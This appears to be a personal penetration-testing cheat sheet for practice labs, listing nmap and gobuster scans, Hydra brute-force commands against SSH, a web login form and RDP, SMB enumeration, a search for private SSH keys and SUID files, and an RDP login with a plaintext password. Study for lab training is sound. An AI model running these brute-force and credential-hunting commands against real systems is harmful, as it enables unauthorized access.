Nmap scan
nmap -sV -sC -o nmap 10.10.85.80

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/




Gobuster 
gobuster dir -e -u 10.10.243.102 -x php,txt,cgi,css,py,html -w /usr/share/dirb/wordlists/common.txt

gobuster dir -u 10.10.81.56 -w directory-list-2.3-medium.txt

wildcard related error
gobuster dir -e -u http://10.10.20.239/api/site-log.php -x php,txt,cgi,css,py,html -w /usr/share/dirb/wordlists/common.txt -s "204,301,302,307,401,403"


Hydra Brute force
https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/
##SSH
kali@kali:~/oscptraining/tryhackme/brooklyn99$ hydra 10.10.216.12 ssh -l jake -P /usr/share/wordlists/rockyou.txt
##HTTP-POST
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
go to inspect element > network > edit and send the post request, copy referer:request body:failed message

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.246.210 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=kcSMO%2FXF1GCTeqt5uRKPoYMbob7ILPmcJ8MRMGNpv2FneCHIfEXPYOSXqtxv7DNoE8I3ocTwXLS9nE%2BFsrLJiHyETHd061sGnCLUvKIZ98Tw51yIvJPBPwCnvZkSPBN1IGUjaSXna2xuK3zLhKzuJMYEMGp%2BJaP2%2FnW3KLtiHdSkJNaf&__EVENTVALIDATION=An1jltDUr%2FrJuqK%2FrWVjD8jVjSf5VMWKvH%2BRo5qQE9Qj4eGYCBTjNSWsFE5%2FEkHkpfIodOJNXbmfoUTYDVGixWMGR8Uh4t4o5X9Rt16ieHoB4SXqj2wNQW3KckOfeclwpBQJbmdFBCPS%2FdzwfeBzvm1jPbMdBiH2IFcI0iE0FX3uIkeq&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"

Brute force against a protocol of your choice
hydra -P <wordlist> -v <ip> <protocol>

Attack a Windows Remote Desktop with a password list.
hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>




SMB Enum (port 445, 139)
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.117.251
smbclient ///10.10.117.251/Users

Our vulnerable machine in this example has a directory called backups containing an SSH key that we can use for authentication. This was found via: find / -name id_rsa 2> /dev/null....Let's break this down:

We're using find to search the volume, by specifying the root (/) to search for files named "id_rsa" which is the name for private SSH keys, and then using 2> /dev/null to only show matches to us.


search the machine for executables with the SUID permission set: find / -perm -u=s -type f 2>/dev/


for remote desktop
xfreerdp /u:littlehelper /p:iLove5now! /v:10.10.247.111

PowerShell Invoke-WebRequest







